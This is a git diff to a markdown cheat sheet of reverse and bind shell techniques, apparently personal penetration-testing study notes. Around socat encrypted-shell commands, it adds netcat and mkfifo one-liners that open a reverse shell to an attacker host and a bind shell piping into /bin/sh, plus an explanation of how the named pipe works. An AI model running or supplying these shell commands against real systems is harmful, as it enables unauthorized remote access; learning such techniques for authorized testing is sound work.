@@ -56,6 +56,11 @@ socat OPENSSL-LISTEN:<port_number>,cert=shell.pem,verify=0 - [FILE:'tty',raw,ech
 socat OPENSSL:<lhost>:<rport>,verify=0 EXEC:/bin/bash
 ```
 
+```Bash
+# Create a listener for a reverse shell (BRUH IDK)
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
 ## Spawning Bind Shells
 
 ```Bash
@@ -84,3 +89,8 @@ socat OPENSSL-LISTEN:<port_number>,cert=shell.pem,verify=0 -
 # Connect back to the listener from the attacking machine
 socat OPENSSL:<lhost>:<lport>,verify=0 EXEC:/bin/bash
 ```
+
+```Bash
+# Creating a listener for a bind shell (IDK WHAT)
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+#The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
